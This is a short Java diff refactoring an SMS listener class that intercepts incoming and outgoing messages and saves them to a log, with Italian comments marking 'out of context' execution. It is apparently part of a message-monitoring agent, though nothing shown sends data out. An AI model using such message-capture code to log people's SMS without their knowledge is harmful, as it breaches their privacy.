@@ -21,21 +21,33 @@ public class SMSOUTListener implements OutboundMessageListener {
     public boolean stop = false;
     
     public SMSOUTListener(SmsListener smsListener) {
-        this.smsListener = smsListener;
+        this.smsListener = smsListener;                
     }
-
+   
+    /**
+     * ESECUZIONE FUORI CONTESTO
+     */
     public void notifyOutgoingMessage(Message message) {
+        init();
         //#ifdef DEBUG_INFO
         debug.info("notifyOutgoingMessage: " + message.getAddress()); //  sms://9813746
         //#endif
-
-        if(!Path.isInizialized()){
-            Path.makeDirs();
-        }
+        
         smsListener.saveLog(message, false);
     }
 
+    private void init() {
+        if(!Path.isInizialized()){
+            Path.makeDirs();
+        }
+        Debug.init();
+    }
+
+    /**
+     * ESECUZIONE FUORI CONTESTO
+     */
     public void notifyIncomingMessage(MessageConnection arg0) {
+        init();
         //#ifdef DEBUG_INFO
         debug.info("notifyIncomingMessage: " + arg0.toString());
         //#endif        
